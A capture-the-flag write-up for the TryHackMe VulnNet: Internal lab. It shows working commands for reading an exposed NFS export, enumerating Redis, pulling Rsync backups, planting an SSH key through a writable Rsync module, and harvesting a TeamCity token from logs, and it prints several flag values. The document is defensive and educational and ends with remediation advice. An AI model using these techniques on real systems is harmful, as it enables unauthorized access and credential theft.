---
description: >-
  An authorized walkthrough covering NFS, Redis, Rsync, SMB, SSH, and TeamCity
  exposure.
---

# VulnNet: Internal Write-Up

## VulnNet: Internal

> **Scope:** This walkthrough covers the authorized [TryHackMe VulnNet: Internal room](https://tryhackme.com/room/vulnnetinternal). Test only systems you own or are authorized to assess.

### Overview

The target exposes several internal services. The attack chain begins with an open NFS export. Its Redis configuration exposes service credentials. Redis then reveals Rsync access. Writable Rsync backups allow SSH access as `sys-internal`.

That account can inspect TeamCity logs. Those logs disclose a super-user token. A local SSH tunnel exposes TeamCity for further authorized testing.

### Reconnaissance

Scan the target before interacting with each service.

```bash
nmap -sC -sV -p- TARGET_IP
```

The scan identifies these relevant services:

* SSH on port `22`
* SMB on ports `139` and `445`
* Rsync on port `873`
* NFS and RPC services on ports `111` and `2049`
* Redis on port `6379`

SMB signing is enabled but not required. This weakens protection against certain SMB attacks.

### NFS exposed Redis configuration

List the target's NFS exports:

```bash
showmount -e TARGET_IP
```

The target exports `/opt/conf`. Mount it locally and inspect the Redis configuration:

```bash
sudo mount -t nfs TARGET_IP:/opt/conf /mnt
find /mnt -type f
```

The Redis configuration reveals that Redis is externally reachable. It also contains authentication material. Treat recovered credentials as secrets. Do not reuse or publish them.

{% hint style="warning" %}
Redis should bind only to required private interfaces. Require authentication, restrict network access, and protect configuration exports.
{% endhint %}

### Redis enumeration

Authenticate to Redis with the authorized lab credential. Enumerate keys and inspect their types:

```bash
redis-cli -h TARGET_IP
AUTH <REDACTED>
KEYS *
TYPE "internal flag"
LRANGE authlist 0 -1
```

The `internal flag` key contains:

```
THM{ff8e518addbbddb74531a724236a8221}
```

The `authlist` values decode to Rsync credentials. Keep those values private.

### Rsync backup exposure

List the authenticated Rsync modules:

```bash
rsync -av --list-only rsync://rsync-connect@TARGET_IP/
```

The `files` module exposes backup data from several user home directories. Download it for offline review:

```bash
rsync -av \
  rsync://rsync-connect@TARGET_IP/files/ \
  ./files/ \
  --password-file=./rsync-password
```

The backup includes the user flag:

```
THM{da7c20696831f253e0afaca8b83c07ab}
```

The service also permits writes under `sys-internal`. In this authorized lab, write access can place an SSH public key in that user's `authorized_keys` file.

```bash
ssh-keygen -t rsa -f id_rsa_sys -N ""
mkdir -p /tmp/ssh-upload/.ssh
cp id_rsa_sys.pub /tmp/ssh-upload/.ssh/authorized_keys

rsync -av /tmp/ssh-upload/ \
  rsync://rsync-connect@TARGET_IP/files/sys-internal/ \
  --password-file=./rsync-password

ssh -i id_rsa_sys sys-internal@TARGET_IP
```

{% hint style="danger" %}
Do not grant write access to user home backups. Rsync modules should use least privilege and separate read-only backups from writable upload paths.
{% endhint %}

### SMB share enumeration

Anonymous SMB access exposes a `shares` share:

```bash
smbclient -L //TARGET_IP -N
smbclient //TARGET_IP/shares -N
```

The `temp/services.txt` file contains another flag:

```
THM{0a09d51e488f5fa105d8d866a497440a}
```

Disable anonymous access unless it is strictly required. Do not store sensitive service data in publicly readable shares.

### TeamCity administrative exposure

As `sys-internal`, enumerate TeamCity processes and files:

```bash
find / -iname '*teamcity*' 2>/dev/null
ps aux | grep -i teamcity
grep -i 'Super user authentication token' /TeamCity/logs/catalina.out
```

The TeamCity logs contain super-user authentication tokens. Tokens must not appear in logs readable by non-administrative users.

Tunnel TeamCity's local listener through SSH:

```bash
ssh -i id_rsa_sys \
  -L 8111:127.0.0.1:8111 \
  sys-internal@TARGET_IP
```

Open `http://127.0.0.1:8111` locally. Use the recovered token only within the authorized lab.

### Root access

The supplied session confirms root-level access and retrieves this root flag:

```
THM{e8996faea46df09dba5676dd271c60bd}
```

The captured log does not show the TeamCity configuration or build action causing the final elevation. Do not infer a specific TeamCity exploit without evidence.

### Remediation

* Restrict NFS exports to required hosts and paths.
* Bind Redis to private interfaces and protect its configuration.
* Use read-only, least-privilege Rsync backups.
* Disable anonymous SMB access and remove sensitive files from shares.
* Rotate exposed TeamCity tokens and restrict access to application logs.
